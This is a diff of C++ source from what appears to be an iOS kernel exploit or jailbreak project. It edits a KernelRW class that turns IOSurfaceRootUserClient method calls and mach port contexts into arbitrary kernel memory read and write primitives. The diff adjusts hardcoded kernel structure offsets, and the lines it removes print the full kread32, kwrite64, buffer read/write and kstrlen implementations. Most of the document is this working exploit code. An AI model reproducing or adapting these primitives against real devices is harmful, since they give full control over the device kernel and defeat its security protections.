@@ -10,21 +10,17 @@
 #include <thread>
 #include <unistd.h>
 #include "iokit.h"
+#include "../krw.h"
+#include "../offsets.h"
 
 #define READ_CONTEXT_MAGIC 0x4142434445464748
 
-static uint64_t off_task_itk_space = 0x330;
-static uint64_t off_ipc_space_is_table = 0x20;
-static uint64_t size_ipc_entry = 0x18;
+static uint32_t size_ipc_entry = 0x18;
+static uint32_t off_IOSurfaceRootUserClient_surfaceClients = 0x118;
+static uint32_t off_rw_deref_1 = 0x40;
+static uint32_t off_write_deref = 0x360;
+static uint32_t off_read_deref  = 0xb4;
 
-static uint64_t off_ipc_port_ip_kobject = 0x58;
-
-static uint64_t off_IOSurfaceRootUserClient_surfaceClients = 0x118;
-
-
-static uint64_t off_rw_deref_1 = 0x40;
-static uint64_t off_write_deref = 0x360;
-static uint64_t off_read_deref  = 0xb4;
 
 #define MAKE_KPTR(v) (v | 0xffffff8000000000)
 
@@ -298,13 +294,11 @@ void KernelRW::doRemotePrimitivePatching(mach_port_t transmissionPort, uint64_t 
     debug("doRemotePrimitivePatching send2=0x%08x",kr);
 }
 
-#ifdef MAINAPP
 void KernelRW::setOffsets(uint64_t kernelBase, uint64_t kernProc, uint64_t allProc){
     _kernel_base_addr = kernelBase;
     _kernel_proc_addr = kernProc;
     _all_proc_addr = allProc;
 }
-#endif
 
 #ifdef PSPAWN
 void KernelRW::getOffsets(uint64_t *kernelBase, uint64_t *kernProc, uint64_t *allProc){
@@ -319,142 +313,3 @@ void KernelRW::getOffsets(uint64_t *kernelBase, uint64_t *kernProc, uint64_t *al
     }
 }
 #endif
-
-#pragma mark final primitives
-uint32_t KernelRW::kread32(uint64_t where){
-    kern_return_t kr = KERN_SUCCESS;
-    uint64_t i_scalar[1] = {
-        _IOSurface_id_write //fixed, first valid client obj
-    };
-    uint64_t o_scalar[1];
-    uint32_t i_count = 1;
-    uint32_t o_count = 1;
-
-    std::unique_lock<std::mutex> ul(_rw_lock);
-    retassure(!(kr = mach_port_set_context(mach_task_self(), _context_read_port, where-off_read_deref)), "Failed to set context with error=0x%x08x", kr);
-    kr = IOConnectCallMethod(
-                             _IOSurfaceRootUserClient,
-                             8, // s_get_ycbcrmatrix
-                             i_scalar, i_count,
-                             NULL, 0,
-                             o_scalar, &o_count,
-                             NULL, NULL);
-    retassure(!kr, "kread32 failed with error=0x%08x", kr);
-    return (uint32_t)o_scalar[0];
-}
-
-uint64_t KernelRW::kread64(uint64_t where){
-    return ( (((uint64_t)kread32(where+4)) << 32) | kread32(where) );
-}
-
-void KernelRW::kwrite32(uint64_t where, uint32_t what){
-    union Struct3264 {
-        uint32_t int32bit[2];
-        uint64_t int64bit;
-    };
-    union Struct3264 data;
-    data.int32bit[0] = what;
-    data.int32bit[1] = kread32(where + 4);
-
-    kwrite64(where, data.int64bit);
-}
-
-void KernelRW::kwrite64(uint64_t where, uint64_t what){
-    kern_return_t kr = KERN_SUCCESS;
-    uint64_t i_scalar[3] = {
-        _IOSurface_id_write, // fixed, first valid client obj
-        0, // index
-        what, // value
-    };
-    uint32_t i_count = 3;
-    std::unique_lock<std::mutex> ul(_rw_lock);
-    retassure(!(kr = mach_port_set_context(mach_task_self(), _context_read_port, _context_write_context_addr-off_write_deref)), "Failed to set context with error=0x%08x", kr);
-    retassure(!(kr = mach_port_set_context(mach_task_self(), _context_write_port, where)), "Failed to set context with error=0x%08x", kr);
-    kr = IOConnectCallMethod(
-            _IOSurfaceRootUserClient,
-            33, // s_set_indexed_timestamp
-            i_scalar, i_count,
-            NULL, 0,
-            NULL, NULL,
-            NULL, NULL);
-    retassure(!kr, "kwrite64 failed with error=0x%08x", kr);
-}
-
-size_t KernelRW::kreadbuf(uint64_t where, void *p, size_t size){
-    size_t remainder = size % 4;
-    if (remainder == 0)
-        remainder = 4;
-    size_t tmpSz = size + (4 - remainder);
-    if (size == 0)
-        tmpSz = 0;
-
-    uint32_t *dstBuf = (uint32_t *)p;
-
-    size_t alignedSize = (size & ~0b11);
-    for (int i = 0; i < alignedSize; i+=4){
-        dstBuf[i/4] = kread32(where + i);
-    }
-    if (size > alignedSize) {
-        uint32_t r = kread32(where + alignedSize);
-        memcpy(((uint8_t*)p)+alignedSize, &r, size-alignedSize);
-    }
-    return size;
-}
-
-size_t KernelRW::kwritebuf(uint64_t where, const void *p, size_t size){
-    size_t remainder = size % 8;
-    if (remainder == 0)
-        remainder = 8;
-    size_t tmpSz = size + (8 - remainder);
-    if (size == 0)
-        tmpSz = 0;
-    
-    uint64_t *dstBuf = (uint64_t *)p;
-    size_t alignedSize = (size & ~0b111);
-
-    for (int i = 0; i < alignedSize; i+=8){
-        kwrite64(where + i, dstBuf[i/8]);
-    }
-    if (size > alignedSize) {
-        uint64_t val = kread64(where + alignedSize);
-        memcpy(&val, ((uint8_t*)p) + alignedSize, size-alignedSize);
-        kwrite64(where + alignedSize, val);
-    }
-    return size;
-}
-
-unsigned long KernelRW::kstrlen(uint64_t where){
-    if (!where)
-        return 0;
-
-    union buf32 {
-        uint32_t int32;
-        char buf[4];
-    };
-    union buf32 buf;
-
-    unsigned long len = 0;
-    long i = 0;
-    while (true){
-        buf.int32 = kread32(where + i);
-        for (int j = 0; j < 4; j++){
-            if (!buf.buf[j]){
-                len += j;
-                return len;
-            }
-        }
-        len += 4;
-        i += 4;
-    }
-}
-
-uint64_t KernelRW::getTaskSelfAddr(void){
-    return _task_self_addr;
-}
-
-uint64_t KernelRW::getKobjAddrForPort(mach_port_t port){
-    uint64_t portAddr = MAKE_KPTR(getPortAddr(port, _task_self_addr, [this](uint64_t where)->uint64_t{
-        return kread64(where);
-    }));
-    return MAKE_KPTR(kread64(portAddr + off_ipc_port_ip_kobject));
-}
